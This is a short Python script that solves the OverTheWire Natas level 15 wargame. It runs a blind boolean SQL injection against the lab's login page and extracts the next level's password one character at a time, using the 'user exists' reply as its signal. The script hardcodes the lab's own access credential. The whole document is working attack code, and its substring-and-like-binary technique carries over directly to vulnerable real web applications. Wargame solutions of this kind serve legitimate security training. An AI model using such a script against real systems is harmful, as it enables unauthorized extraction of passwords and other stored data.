#!/usr/bin/python

import requests
import string
import sys

# query: SELECT * from users where username="<payload>";

password_length = 32
space = string.ascii_letters + "1234567890"

url = "http://natas15.natas.labs.overthewire.org/index.php"

s = requests.Session()
s.auth = (u'natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')

password = ''
for k in range(1, password_length + 1):
    for i in space:
        sys.stdout.write(f"\r{password}{i}")
        rep = s.post(url, data = {"username": f'natas16" and substring(password, {k}, 1) like binary "{i}'})
        if "user exists" in rep.text:
            password += i
            break
